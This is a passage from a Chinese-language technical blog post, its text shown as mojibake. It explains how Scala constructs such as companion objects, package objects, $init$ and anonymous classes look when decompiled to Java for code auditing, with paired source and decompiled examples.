MODULE$;</span><br><span class="line">   <span class="keyword">private</span> String org$example$Singletons$$call;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Singletons$</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> String org$example$Singletons$$call() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.org$example$Singletons$$call;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> org$example$Singletons$$call_$eq(<span class="keyword">final</span> String x$<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">this</span>.org$example$Singletons$$call = x$<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">(<span class="keyword">final</span> String llac)</span> &#123;</span><br><span class="line">      .MODULE$.println(llac);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Singletons</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singletons</span>();</span><br><span class="line">      <span class="built_in">this</span>.sayHello(s.org$example$Singletons$$llac());</span><br><span class="line">      s.org$example$Singletons$$callSingleField();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> Singletons$() &#123;</span><br><span class="line">      MODULE$ = <span class="built_in">this</span>;</span><br><span class="line">      <span class="built_in">this</span>.org$example$Singletons$$call = <span class="string">&quot;ä¹æ•å•Šï¼Œæˆ‘æ˜¯ä¼´ç”Ÿå¯¹è±¡çš„ç§æœ‰å±æ€§ï¼Œæˆ‘è¢«ä¼´ç”Ÿç±»è°ƒç”¨äº†&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">```  </span><br><span class="line">åœ¨åç¼–è¯‘åçš„ä»£ç ä¸­ï¼Œæ³¨è§£`<span class="meta">@ScalaSignature</span>`ä¿å­˜äº†`Scala`ç±»çš„ç­¾åä¿¡æ¯ï¼ŒåŒ…æ‹¬ç±»çš„ç±»å‹å‚æ•°ã€æ„é€ å‡½æ•°å‚æ•°ç±»å‹å’Œè¿”å›ç±»å‹ç­‰ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯å¯¹äºä»£ç å®¡è®¡å¹¶ä¸ä¼šäº§ç”Ÿå½±å“ï¼Œç›´æ¥æ— è§†å³å¯ã€‚   </span><br><span class="line">åœ¨åç¼–è¯‘åçš„ä»£ç ä¸­ï¼Œäº§ç”Ÿäº†ä¸¤ä¸ªç‰¹æ®Šçš„ä¸­é—´å˜é‡`MODULE$` ä»¥åŠ `.MODULE$`ï¼Œæœ¬èŠ‚å°†ä»‹ç»`MODULE$`å˜é‡ï¼Œ`.MODULE$`å°†åœ¨ä¸‹èŠ‚ä¸åŒ…å¯¹è±¡ä¸€èŠ‚å¼•å‡ºã€‚  </span><br><span class="line">```java</span><br><span class="line"><span class="keyword">private</span> Singletons$() &#123;</span><br><span class="line">      MODULE$ = <span class="built_in">this</span>;</span><br><span class="line">      <span class="built_in">this</span>.org$example$Singletons$$call = <span class="string">&quot;ä¹æ•å•Šï¼Œæˆ‘æ˜¯ä¼´ç”Ÿå¯¹è±¡çš„ç§æœ‰å±æ€§ï¼Œæˆ‘è¢«ä¼´ç”Ÿç±»è°ƒç”¨äº†&quot;</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨ä¼´ç”Ÿå¯¹è±¡çš„ç§æœ‰æ„é€ æ–¹æ³•ä¸­<code>MODULE$</code>è¢«èµ‹å€¼ä¸º<code>this</code>ï¼Œåœ¨<code>Java</code>ä¸­<code>this</code>è¡¨ç¤ºå½“å‰å¯¹è±¡å®ä¾‹çš„å¼•ç”¨ï¼Œå³<code>this</code>ä¹ƒ<code>Singletons$</code>å•ä¾‹å¯¹è±¡çš„å¼•ç”¨ã€‚<br>ä¼´ç”Ÿå¯¹è±¡è¢«ç§°ä¸ºä¼´ç”Ÿç±»çš„å•ä¾‹å¯¹è±¡ä¹ƒæ˜¯é€šè¿‡é™æ€ä»£ç å—çš„æ–¹å¼å®ç°ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Singletons$</span>();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>æ ¹æ®<code>jvm</code>ç±»åŠ è½½çš„åŸç†ï¼ˆåŠ è½½-&gt;é“¾æ¥-&gt;åˆå§‹åŒ–ï¼‰ï¼Œé™æ€ä»£ç å—çš„æ‰§è¡Œå‡ºç°åœ¨åˆå§‹åŒ–é˜¶æ®µ<code>&lt;clinit&gt;()</code>ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™éƒ¨åˆ†ä»£ç åœ¨<code>jvm</code>çš„ä¸€æ¬¡è¿è¡Œå‘¨æœŸä¸­åªä¼šè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œå³å®ç°äº†å•ä¾‹å¯¹è±¡çš„ç”Ÿæˆã€‚</p>
<h3 id="åŒ…å¯¹è±¡"><a href="#åŒ…å¯¹è±¡" class="headerlink" title="åŒ…å¯¹è±¡"></a>åŒ…å¯¹è±¡</h3><blockquote>
<p>æœ¬èŠ‚å°†ä»‹ç»<code>.MODULE$</code>çš„å«ä¹‰   </p>
</blockquote>
<p>åŒ…å¯¹è±¡å…è®¸åœ¨ä¸€ä¸ªåŒ…ä¸­å®šä¹‰å…¬å…±çš„æ–¹æ³•ã€å¸¸é‡ä»¥åŠç±»å‹åˆ«åï¼Œä»¥ä¾¿åœ¨è¯¥åŒ…çš„æ‰€æœ‰ <code>Scala</code> æ–‡ä»¶ä¸­å…±äº«å’Œè®¿é—®è¿™äº›æˆå‘˜ã€‚å¦‚æœä½ åœ¨ä½¿ç”¨<code>IDEA</code>è¿›è¡Œå®¡è®¡æ—¶å‘ç°æŸä¸ªæ–¹æ³•ä¸èƒ½æ­£å¸¸è·³è½¬ï¼Œè¯·åˆ°å½“å‰ç±»çš„åŒ…ç›®å½•ä¸‹æ‰¾åˆ°åä¸º<code>package.class</code>çš„æ–‡ä»¶å¹¶å°è¯•åœ¨å…¶ä¸­æ‰¾åˆ°è¯¥æ–¹æ³•å®šä¹‰ã€‚<br>é¦–å…ˆåœ¨<code>org.example</code>åŒ…ä¸‹å®šä¹‰åŒ…å¯¹è±¡  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> <span class="class"><span class="keyword">object</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">greetExample</span></span>(): <span class="type">String</span> = <span class="string">s&quot;ä½ å¥½, æˆ‘æ˜¯org.exampleåŒ…!&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶ååœ¨å…¶å­åŒ…<code>org.example.subPackage</code>ä¸­å®šä¹‰å¦ä¸€ä¸ªåŒ…å¯¹è±¡</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> <span class="class"><span class="keyword">object</span> <span class="title">subPackage</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">greetTest</span></span>(): <span class="type">String</span> = <span class="string">s&quot;ä½ å¥½, æˆ‘æ˜¯org.example.subPackageåŒ…!&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ¥ç€åœ¨<code>org.example</code>åŒ…ä¸‹å®šä¹‰ç±»<code>PackageObject</code>ï¼Œè¯¥ç±»å®šä¹‰äº†ä¸€ä¸ªæ–¹æ³•<code>packageGreet</code>åˆ†åˆ«ä»ä¸Šè¿°ä¸¤å¤„è°ƒç”¨å…±äº«æ–¹æ³•<code>greetExample</code>ä»¥åŠ<code>greetTest</code></p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subPackage.greetTest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PackageObject</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">packageGreet</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">    greetExample()</span><br><span class="line">    greetTest()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä»¥<code>org.example</code>ä¸‹çš„åŒ…å¯¹è±¡ä¸ºä¾‹ã€‚åœ¨å®šä¹‰è¯¥åŒ…å¯¹è±¡æ—¶ä½¿ç”¨äº†<code>object</code>å…³é”®å­—ä¿®é¥°ï¼Œæ•…å¯çŸ¥åŒ…å¯¹è±¡ä¹ƒæ˜¯ä¼´ç”Ÿå¯¹è±¡ï¼Œåœ¨è¿›è¡Œä»£ç ç¼–è¯‘æ—¶ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªä¸ä¹‹ç›¸å…³çš„ä¼´ç”Ÿç±»ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸‹é¢çš„ä»£ç ä¸­å¤šå‡º <code>package</code> ç±»çš„åŸå› ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//decompiled from package.class</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scala.reflect.ScalaSignature;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">package</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">greetExample</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">package</span>$.MODULE$.greetExample();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//decompiled from package$.class</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">package$</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">package</span>$ MODULE$;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">package$</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">greetExample</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;ä½ å¥½, æˆ‘æ˜¯org.exampleåŒ…å¯¹è±¡!&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">package</span>$() &#123;</span><br><span class="line">      MODULE$ = <span class="built_in">this</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>PackageObject.class</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//decompiled from PackageObject.class</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.example.<span class="keyword">package</span>.;</span><br><span class="line"><span class="keyword">import</span> scala.reflect.ScalaSignature;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PackageObject</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">packageGreet</span><span class="params">()</span> &#123;</span><br><span class="line">      .MODULE$.greetExample();</span><br><span class="line">      org.example.testPackage.<span class="keyword">package</span>..MODULE$.greetTest();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è§‚å¯Ÿä¸Šæ–‡åç¼–è¯‘ä»£ç ï¼Œæœ‰ä¸¤ä¸ªé—®é¢˜éœ€è¦å›ç­”ã€‚å…¶ä¸€ï¼Œ<code>greetExample</code>è¿™ä¸ªæ–¹æ³•æ¥è‡ªå“ªé‡Œï¼Œä¸ºä½•é€šè¿‡<code>IDEA</code>ä¸èƒ½è¿›è¡Œç´¢å¼•è·³è½¬ï¼› å…¶äºŒï¼Œ<code>.MODULE$</code>åˆ°åº•æ˜¯ä»€ä¹ˆå˜é‡ï¼Œä¸ºä½•åœ¨ä»£ç ä¸­æ²¡æœ‰ä»»ä½•çš„å£°æ˜ã€‚<br>åˆçœ‹<code>.MODULE$.greetExample();</code>æ˜¯ä¸€ä¸ªæœ‰äº›å¥‡æ€ªçš„ç”¨æ³•ï¼Œè¯­å¥ç«Ÿç„¶ä»¥<code>.</code>å¼€å¤´ï¼Œä¸è¿‡å¦‚æœå°†<code>import org.example.package.;</code>ä¸ä¹‹è¿æ¥å¾—åˆ°<code>org.example.package..MODULE$.greetExample();</code>ï¼Œè¿™æ ·å°±ä¸ä¸‹ä¸€è¡Œä¸­<code>org.example.testPackage.package..MODULE$.greetTest();</code>çš„è°ƒç”¨æ–¹å¼ä¸€æ ·ï¼Œ<br>äºæ˜¯æƒ…å†µä¼¼ä¹å˜å¾—åˆç†èµ·æ¥ã€‚<br>ä¸€ä¸ªæ–°çš„æƒ…å†µå‡ºç°äº†ï¼Œçœ‹å¦‚ä¸‹ä»£ç ï¼š  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scala.<span class="type">Predef</span>.;</span><br><span class="line">.<span class="type">MODULE</span>$.println(<span class="string">&quot;æˆ‘æ¥è‡ªPredefä¼´ç”Ÿå¯¹è±¡&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>Scala</code>åŒ…ä¸‹ï¼Œ<code>Predef</code> æ˜¯ä¸€ä¸ªä¼´ç”Ÿå¯¹è±¡ï¼Œä½†å…¶å¹¶ä¸æ˜¯åŒ…å¯¹è±¡ï¼Œä¸ºä½•å…¶ä¹Ÿé€šè¿‡<code>.MODULE$</code>å˜é‡æ¥å¼•ç”¨æ–¹æ³•ã€‚<br>å…¶å®åŒ…å¯¼å…¥æœ«å°¾çš„<code>.</code>è¡¨ç¤ºå¯¼å…¥å½“å‰å¯¹è±¡ä¸­çš„æ‰€æœ‰é™æ€æˆå‘˜ï¼Œè€Œ<code>Predef</code>åˆæ˜¯ä¼´ç”Ÿå¯¹è±¡ï¼ŒåŒæ—¶å…¶<code>Module$</code>å˜é‡ä¹Ÿæ˜¯é™æ€æˆå‘˜ï¼ŒåŠ ä¹‹åœ¨å¯¼å…¥ä½ç½®ä¹Ÿå¯èƒ½å­˜åœ¨é™æ€æˆå‘˜<code>MODULE$</code> æ•…ä½¿ç”¨<code>.MODULE$</code>åŠ ä»¥åŒºåˆ†ã€‚<br>åœ¨åæ–‡<code>akka</code>æ¡†æ¶ä¸€ç« ï¼Œè¿˜å°†ä»‹ç»è¯¥å˜é‡çš„å¦ä¸€ç§ç”¨æ³•ã€‚</p>
<h3 id="åˆå§‹åŒ–ä»£ç "><a href="#åˆå§‹åŒ–ä»£ç " class="headerlink" title="åˆå§‹åŒ–ä»£ç "></a>åˆå§‹åŒ–ä»£ç </h3><blockquote>
<p>æœ¬èŠ‚å°†æ¶‰åŠæ–¹æ³•<code>$init$</code>çš„å«ä¹‰  </p>
</blockquote>
<p>æœ‰å¦‚ä¸‹ä»£ç   </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StaticCode</span></span>&#123;</span><br><span class="line">  println(<span class="string">&quot;æˆ‘æ˜¯ç±»ä¸»ä½“ä»£ç &quot;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   print(<span class="string">&quot;æˆ‘æ—¶åˆå§‹åŒ–ä»£ç å—&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> code = &#123;</span><br><span class="line">   print(<span class="string">&quot;æˆ‘æ˜¯å˜é‡åˆå§‹åŒ–ä»£ç &quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">StaticCode</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">var</span> sc: <span class="type">StaticCode</span> =  <span class="keyword">new</span> <span class="type">StaticCode</span>()</span><br><span class="line">    println(<span class="string">&quot;Hello&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶åç¼–è¯‘ä¸º<code>Java</code>ä»£ç åï¼Œè‹¥å…¶ç±»ä¸»ä½“ã€å˜é‡åˆå§‹åŒ–ä»£ç ã€ç±»åˆå§‹åŒ–ä»£ç å—ä¸­è‹¥å­˜åœ¨è¾ƒä¸ºå¤æ‚çš„é€»è¾‘ï¼Œ<code>Scala</code>ç¼–è¯‘å™¨å°†è‡ªåŠ¨ç”Ÿæˆåä¸º<code>$init$</code>çš„æ–¹æ³•ã€‚<br>å¦ä¸€ç§æƒ…å†µï¼Œè‹¥çˆ¶ç±»å­˜åœ¨ç±»ä¸»ä½“ï¼Œåˆ™ç±»ä¸»ä½“ä¸­çš„ä»£ç å°†è¢«ç»„åˆä¸º<code>$init$</code>æ–¹æ³•ã€‚  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Nested</span></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> s: <span class="type">String</span> = <span class="string">&quot;æˆ‘æ˜¯åµŒå¥—ç‰¹è´¨&quot;</span></span><br><span class="line">  println(s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassNested</span> <span class="keyword">extends</span> <span class="title">Nested</span> </span>&#123;</span><br><span class="line">  println(s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åç¼–è¯‘åç»“æœå¦‚ä¸‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scala.Predef.;</span><br><span class="line"><span class="keyword">import</span> scala.reflect.ScalaSignature;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Nested</span> &#123;</span><br><span class="line">   String <span class="title function_">s</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">void</span> s_$eq(<span class="keyword">final</span> String x$<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> <span class="keyword">void</span> $init$(<span class="keyword">final</span> Nested $<span class="built_in">this</span>) &#123;</span><br><span class="line">      $<span class="built_in">this</span>.s_$eq(<span class="string">&quot;æˆ‘æ˜¯åµŒå¥—ç‰¹è´¨&quot;</span>);</span><br><span class="line">      .MODULE$.println($<span class="built_in">this</span>.s());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scala.reflect.ScalaSignature;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassNested</span> <span class="keyword">implements</span> <span class="title class_">Nested</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> String s;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">s</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.s;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> s_$eq(<span class="keyword">final</span> String x$<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">this</span>.s = x$<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">ClassNested</span><span class="params">()</span> &#123;</span><br><span class="line">      Nested.$init$(<span class="built_in">this</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>ClassNested</code>çš„æ— å‚æ„é€ æ–¹æ³•ä¸­è°ƒç”¨äº†æ¥å£ï¼ˆç‰¹è´¨ï¼‰çš„<code>$init$</code>æ–¹æ³•ï¼Œè€Œ<code>$init$</code>æ–¹æ³•åˆ™å°è£…äº†ç‰¹è´¨çš„ç±»ä¸»ä½“é€»è¾‘ã€‚</p>
<h3 id="ä¼ å‚åŒ¿åç±»"><a href="#ä¼ å‚åŒ¿åç±»" class="headerlink" title="ä¼ å‚åŒ¿åç±»"></a>ä¼ å‚åŒ¿åç±»</h3><blockquote>
<p>æœ¬èŠ‚å°†æ¶‰åŠ<code>apply</code>æ–¹æ³•</p>
</blockquote>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªéœ€è¦ä¼ å‚çš„åŒ¿åç±»  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">AnonymousClass</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">   <span class="comment">// runnableç±»å‹ä¸ºFunction1</span></span><br><span class="line">    <span class="keyword">val</span> runnable = <span class="keyword">new</span> (<span class="type">String</span> =&gt; <span class="type">Unit</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> name: <span class="type">String</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">      <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">apply</span></span>(name: <span class="type">String</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">whoami</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">        println(name)</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="comment">// ä½¿ç”¨Function1 ç±»çš„æ³¨å…¥å™¨è¿›è¡Œä¼ å‚</span></span><br><span class="line">    runnable(<span class="string">&quot;alis&quot;</span>)</span><br><span class="line">    <span class="comment">// è°ƒç”¨æ–¹æ³•</span></span><br><span class="line">    runnable.whoami()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åç¼–è¯‘åçš„ä»£ç å¦‚ä¸‹  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//decompiled from AnonymousClass.class</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scala.reflect.ScalaSignature;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">AnonymousClass</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      AnonymousClass$.MODULE$.main(args);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//decompiled from AnonymousClass$.class</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> scala.Function1;</span><br><span class="line"><span class="keyword">import</span> scala.runtime.BoxedUnit;</span><br><span class="line"><span class="keyword">import</span> scala.runtime.StructuralCallSite;</span><br><span class="line"><span class="keyword">import</span> scala.runtime.ScalaRunTime.;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">AnonymousClass$</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> AnonymousClass$ MODULE$;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">AnonymousClass$</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Method reflMethod$Method1(<span class="keyword">final</span> Class x$<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="type">StructuralCallSite</span> <span class="variable">methodCache1</span> <span class="operator">=</span> apply&lt;invokedynamic&gt;();</span><br><span class="line">      <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> methodCache1.find(x$<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (method1 != <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> method1;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         method1 = .MODULE$.ensureAccessible(x$<span class="number">1.</span>getMethod(<span class="string">&quot;whoami&quot;</span>, methodCache1.parameterTypes()));</span><br><span class="line">         methodCache1.add(x$<span class="number">1</span>, method1);</span><br><span class="line">         <span class="keyword">return</span> method1;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Function1</span> <span class="variable">runnable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Function1</span>() &#123;</span><br><span class="line">         <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// $FF: synthetic method</span></span><br><span class="line">         <span class="comment">// $FF: bridge method</span></span><br><span class="line">         ...</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">apply</span><span class="params">(<span class="keyword">final</span> String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name_$eq(name);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">whoami</span><span class="params">()</span> &#123;</span><br><span class="line">            scala.Predef..MODULE$.println(<span class="built_in">this</span>.name());</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// $FF: synthetic method</span></span><br><span class="line">         <span class="comment">// $FF: bridge method</span></span><br><span class="line">         <span class="keyword">public</span> Object <span class="title function_">apply</span><span class="params">(<span class="keyword">final</span> Object v1)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.apply((String)v1);</span><br><span class="line">            <span class="keyword">return</span> BoxedUnit.UNIT;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> &#123;</span><br><span class="line">            <span class="comment">// ä¸ŠèŠ‚æåˆ°çš„$init$æ–¹æ³• å®Œæˆå¯¹è±¡çš„åˆå§‹åŒ–æ“ä½œ</span></span><br><span class="line">            Function1.$init$(<span class="built_in">this</span>);</span><br><span class="line">            <span class="built_in">this</span>.name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      runnable.apply(<span class="string">&quot;alis&quot;</span>);</span><br><span class="line">      <span class="type">Function1</span> <span class="variable">qual1</span> <span class="operator">=</span> runnable;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         reflMethod$Method1(qual1.getClass()).invoke(qual1);</span><br><span class="line">      &#125; <span class="keyword">catch</span> 